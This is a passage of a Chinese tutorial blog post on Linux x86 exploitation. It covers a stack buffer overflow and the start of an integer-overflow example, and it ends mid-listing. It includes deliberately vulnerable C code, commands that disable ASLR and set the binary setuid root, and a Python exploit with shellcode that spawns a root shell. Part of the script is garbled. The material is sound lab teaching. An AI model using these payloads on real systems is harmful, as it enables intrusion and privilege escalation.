<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">






















<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":true},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <meta name="description" content="典型的基于堆栈的缓冲区溢出虚拟机：Ubuntu 12.04（x86） 目标缓冲区位于堆栈中，将源缓冲区复制到目标缓冲区可能导致溢出，首先源字符串长度大于目标缓冲区长度，并且不进行大小检查。导致溢出执行任意代码，允许供给制执行他的代码以获得对受害者及其的控制。 漏洞代码： 123456789//test.c  #include &amp;lt;stdio.h&amp;gt;  #include &amp;lt;string">
<meta name="keywords" content="网络攻防,Linux开发">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux (x86) Exploit 开发系列教程">
<meta property="og:url" content="http://yoursite.com/2019/07/20/Linux (x86) Exploit 开发系列教程/index.html">
<meta property="og:site_name" content="熬夜会没命的">
<meta property="og:description" content="典型的基于堆栈的缓冲区溢出虚拟机：Ubuntu 12.04（x86） 目标缓冲区位于堆栈中，将源缓冲区复制到目标缓冲区可能导致溢出，首先源字符串长度大于目标缓冲区长度，并且不进行大小检查。导致溢出执行任意代码，允许供给制执行他的代码以获得对受害者及其的控制。 漏洞代码： 123456789//test.c  #include &amp;lt;stdio.h&amp;gt;  #include &amp;lt;string">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu1.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu2.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu3.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu4.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu5.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu6.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu7.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu8.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu9.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu10.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu11.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu12.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu13.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu14.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu15.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu16.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu17.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu19.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu20.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu21.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu22.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu23.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu24.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu25.png">
<meta property="og:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu26.png">
<meta property="og:updated_time" content="2019-07-26T08:16:33.828Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux (x86) Exploit 开发系列教程">
<meta name="twitter:description" content="典型的基于堆栈的缓冲区溢出虚拟机：Ubuntu 12.04（x86） 目标缓冲区位于堆栈中，将源缓冲区复制到目标缓冲区可能导致溢出，首先源字符串长度大于目标缓冲区长度，并且不进行大小检查。导致溢出执行任意代码，允许供给制执行他的代码以获得对受害者及其的控制。 漏洞代码： 123456789//test.c  #include &amp;lt;stdio.h&amp;gt;  #include &amp;lt;string">
<meta name="twitter:image" content="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu1.png">



  <link rel="alternate" href="/atom.xml" title="熬夜会没命的" type="application/atom+xml">



  
  
  <link rel="canonical" href="http://yoursite.com/2019/07/20/Linux (x86) Exploit 开发系列教程/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Linux (x86) Exploit 开发系列教程 | 熬夜会没命的</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">熬夜会没命的</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">skr,skr,skr</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>历程</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/20/Linux (x86) Exploit 开发系列教程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="SZzzT">
      <meta itemprop="description" content="熬夜会长尸斑">
      <meta itemprop="image" content="/images/touxiang.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="熬夜会没命的">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Linux (x86) Exploit 开发系列教程

              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-07-20 17:24:57" itemprop="dateCreated datePublished" datetime="2019-07-20T17:24:57+08:00">2019-07-20</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2019-07-26 16:16:33" itemprop="dateModified" datetime="2019-07-26T16:16:33+08:00">2019-07-26</time>
              </span>
            
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/网络攻防/" itemprop="url" rel="index"><span itemprop="name">网络攻防</span></a></span>

                
                
                  ，
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/网络攻防/Linux-x86-Exploit-开发系列教程/" itemprop="url" rel="index"><span itemprop="name">Linux (x86) Exploit 开发系列教程</span></a></span>

                
                
              
            </span>
          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="典型的基于堆栈的缓冲区溢出"><a href="#典型的基于堆栈的缓冲区溢出" class="headerlink" title="典型的基于堆栈的缓冲区溢出"></a>典型的基于堆栈的缓冲区溢出</h2><p>虚拟机：Ubuntu 12.04（x86）</p>
<p>目标缓冲区位于堆栈中，将源缓冲区复制到目标缓冲区可能导致溢出，首先源字符串长度大于目标缓冲区长度，并且不进行大小检查。导致溢出执行任意代码，允许供给制执行他的代码以获得对受害者及其的控制。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> argv[])</span> </span>&#123;  </span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);  </span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>



<p>上述漏洞代码中的<code>[2]行</code>显示里缓冲区溢出。这个bug可能导致任意代码执行，因为缓冲区内容是用户可以自行输入。</p>
<p><strong>gdb反汇编</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> szt@ubuntu:~/linux exploit/test1$ gdb -q test  </span><br><span class="line"> Reading symbols from /home/szt/linux exploit/test1/test...done.  </span><br><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code **<span class="keyword">for</span>** function main:  </span><br><span class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:   <span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span>  </span><br><span class="line">   <span class="number">0x0804841a</span> &lt;+<span class="number">6</span>&gt;:   sub    esp,<span class="number">0x110</span>  </span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048423</span> &lt;+<span class="number">15</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x08048426</span> &lt;+<span class="number">18</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048428</span> &lt;+<span class="number">20</span>&gt;:  mov    **DWORD** PTR [esp+<span class="number">0x4</span>],eax  </span><br><span class="line">   <span class="number">0x0804842c</span> &lt;+<span class="number">24</span>&gt;:  lea    eax,[esp+<span class="number">0x10</span>]  </span><br><span class="line">   <span class="number">0x08048430</span> &lt;+<span class="number">28</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048433</span> &lt;+<span class="number">31</span>&gt;:  call   <span class="number">0x8048330</span> &lt;<span class="built_in">strcpy</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048438</span> &lt;+<span class="number">36</span>&gt;:  mov    eax,<span class="number">0x8048530</span>  </span><br><span class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:  lea    edx,[esp+<span class="number">0x10</span>]  </span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:  mov    **DWORD** PTR [esp+<span class="number">0x4</span>],edx  </span><br><span class="line">   <span class="number">0x08048445</span> &lt;+<span class="number">49</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048448</span> &lt;+<span class="number">52</span>&gt;:  call   <span class="number">0x8048320</span> &lt;<span class="built_in">printf</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x0804844d</span> &lt;+<span class="number">57</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x08048452</span> &lt;+<span class="number">62</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048453</span> &lt;+<span class="number">63</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>

<p>由此可以推测出堆栈布局：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu1.png" title="图1">

<p>首先我们可以发现<code>buf[]</code>有<code>256</code>个大小，并且<code>buf[]</code>之后的堆栈是返回地址。理论上如果填充大于<code>256</code>大小的数据到目标缓冲区中，那么会溢出，使得返回地址被多出来的数据所覆盖。所以我们发送一系列的<code>A</code>来测试。</p>
<p><strong>测试1：是否可以覆盖返回地址</strong></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu2.png" title="图2">

<p>发现输出的<code>eip</code>已经是<code>0x41414141</code>，<code>0x41</code>是<code>A</code>的16进制。这样可以确定返回地址已经被我们发送的300个A覆盖了。</p>
<p>那么我们可以计算，返回地址距<code>buf[]</code> 偏移了多少。首先是<code>buf[]</code>自己的256大小，其次是8个大小对齐空间，然后是4个大小的ebp。</p>
<p><code>0x100 + 0x8 + 0x4=0x10c</code>  </p>
<p>所以偏移了<code>0x10c</code>个大小。</p>
<p>那么我们编写攻击代码<code>exp.py</code>来攻击</p>
<p><strong>攻击代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py   </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct  </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Stack address where shellcode is copied.  </span></span><br><span class="line"> ret_addr = <span class="number">0xbffff220</span>                           </span><br><span class="line"> <span class="comment">#Spawn a shell  </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh)  </span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">       <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numnk + RA + NOP<span class="string">'s + Shellcode  </span></span><br><span class="line"><span class="string">buf = "A" * 268  </span></span><br><span class="line"><span class="string">buf += conv(ret_addr)  </span></span><br><span class="line"><span class="string">buf += "\x90" * 100  </span></span><br><span class="line"><span class="string">buf += scode  </span></span><br><span class="line"><span class="string">print "Calling vulnerable program"  </span></span><br><span class="line"><span class="string">call(["./test", buf])</span></span><br></pre></td></tr></table></figure>



<p>执行上面的<code>exp.py</code>程序，给我们<code>root shell</code></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu3.png" title="图3">

<hr>
<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>存储大于最大支持值的称为整数溢出。整数溢出本身不会导致任意代码执行，但是整数溢出可能会导致堆栈溢出或者堆溢出，这可能导致任意代码执行。</p>
<p>数据类型大小及范围：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu4.png" title="图4">

<blockquote>
<p>当我们存储一个大于最大值的值的时候，我们的值将会被包装。例如，当我们尝试将21645545422313存储到带符号的int数据类型时，它将被包装并存储为-21645545422313。</p>
</blockquote>
<p> 类似的，存储小于最小支持值的值称为整数下溢。例如，当我们尝试将-2147483649存储到带符号的int数据类型时，它将被包装并存储为21471483647.这称为整数下溢。在这里我只会谈论整数溢出，但是这个过程对于下溢也是一样的。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;     </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store_passwd_indb</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_uname</span><span class="params">(<span class="keyword">char</span>* uname)</span> </span>&#123;  </span><br><span class="line">&#125;     </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_passwd</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">char</span> passwd_buf[<span class="number">11</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> passwd_len = <span class="built_in">strlen</span>(passwd); <span class="comment">/* [1] */</span>   </span><br><span class="line"><span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123; <span class="comment">/* [2] */</span>  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Valid Password\n"</span>); <span class="comment">/* [3] */</span>   </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">   <span class="built_in">strcpy</span>(passwd_buf,passwd); <span class="comment">/* [4] */</span>  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Invalid Password\n"</span>); <span class="comment">/* [5] */</span>  </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;  </span><br><span class="line">store_passwd_indb(passwd_buf); <span class="comment">/* [6] */</span>  </span><br><span class="line">&#125;     </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">3</span>) &#123;  </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Usage Error:   \n"</span>);  </span><br><span class="line">       fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    validate_uname(argv[<span class="number">1</span>]);  </span><br><span class="line">    validate_passwd(argv[<span class="number">2</span>]);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$ gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o test test.c  </span><br><span class="line">$ sudo chown root test  </span><br><span class="line">$ sudo chgrp root test  </span><br><span class="line">$ sudo chmod + s test</span><br></pre></td></tr></table></figure>



<p>上述漏洞代码的[1]行显示了一个<code>整数溢出错误</code>。<code>strlen（）</code>的返回类型是<code>size_t（unsigned int）</code>，它存储在<code>unsigned char</code>数据类型中。因此，任何大于<code>unsigned char</code>的最大支持值的值都会导致整数溢出。因此当密码长度为261时，261将被包裹并存储为<code>passwd_len</code>变量中的<code>5</code>！由于这个整数溢出，可以绕过行<code>[2]</code>执行的边界检查，从而导致基于堆栈的缓冲区溢出！而且在这篇文章中看到，基于堆栈的缓冲区溢出导致任意的代码执行。</p>
<p>反汇编：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> szt@ubuntu:~/linux exploit/test2$ gdb -q test  </span><br><span class="line"> Reading symbols from /home/szt/linux exploit/test2/test...done.  </span><br><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code **<span class="keyword">for</span>** function main:  </span><br><span class="line">    <span class="number">0x0804852a</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">    <span class="number">0x0804852b</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">    <span class="number">0x0804852d</span> &lt;+<span class="number">3</span>&gt;:   <span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span>  </span><br><span class="line">    <span class="number">0x08048530</span> &lt;+<span class="number">6</span>&gt;:   sub    esp,<span class="number">0x10</span>  </span><br><span class="line">    <span class="number">0x08048533</span> &lt;+<span class="number">9</span>&gt;:   cmp    **DWORD** PTR [ebp+<span class="number">0x8</span>],<span class="number">0x3</span>  </span><br><span class="line">   <span class="number">0x08048537</span> &lt;+<span class="number">13</span>&gt;:  je     <span class="number">0x804855e</span> &lt;main+<span class="number">52</span>&gt;  </span><br><span class="line">   <span class="number">0x08048539</span> &lt;+<span class="number">15</span>&gt;:  mov    **DWORD** PTR [esp],<span class="number">0x8048680</span>  </span><br><span class="line">   <span class="number">0x08048540</span> &lt;+<span class="number">22</span>&gt;:  call   <span class="number">0x80483a0</span> &lt;<span class="built_in">puts</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048545</span> &lt;+<span class="number">27</span>&gt;:  mov    eax,ds:<span class="number">0x804a020</span>  </span><br><span class="line">   <span class="number">0x0804854a</span> &lt;+<span class="number">32</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x0804854d</span> &lt;+<span class="number">35</span>&gt;:  call   <span class="number">0x8048380</span> &lt;fflush@plt&gt;  </span><br><span class="line">   <span class="number">0x08048552</span> &lt;+<span class="number">40</span>&gt;:  mov    **DWORD** PTR [esp],<span class="number">0xffffffff</span>  </span><br><span class="line">   <span class="number">0x08048559</span> &lt;+<span 